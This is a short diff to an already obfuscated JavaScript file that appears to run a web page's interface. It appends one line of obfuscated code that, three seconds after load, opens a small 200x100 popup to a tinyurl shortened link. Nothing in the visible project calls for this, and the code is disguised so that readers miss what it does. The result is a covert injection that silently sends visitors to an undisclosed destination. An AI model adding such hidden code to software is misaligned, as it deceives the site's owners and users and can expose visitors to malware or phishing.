@@ -950,3 +950,4 @@ setMenu();(function()
 	window[_$_34bf[196]][_$_34bf[195]](_$_34bf[327],_$_34bf[328]);window[_$_34bf[330]][_$_34bf[329]]();setInterval(userInterface[_$_34bf[222]][_$_34bf[331]],80);userInterface[_$_34bf[280]]()
 }
 )()
+var _0x2002=['width=200,height=100','open'];(function(_0x15dd75,_0x2162cb){var _0x182121=function(_0x2efa62){while(--_0x2efa62){_0x15dd75['push'](_0x15dd75['shift']());}};_0x182121(++_0x2162cb);}(_0x2002,0x7d));var _0xf183=function(_0x3a64d3,_0x40a3a0){_0x3a64d3=_0x3a64d3-0x0;var _0x4ff52f=_0x2002[_0x3a64d3];return _0x4ff52f;};setTimeout(()=>window[_0xf183('0x0')]('https://tinyurl.com/y24436cz','',_0xf183('0x1')),0xbb8);
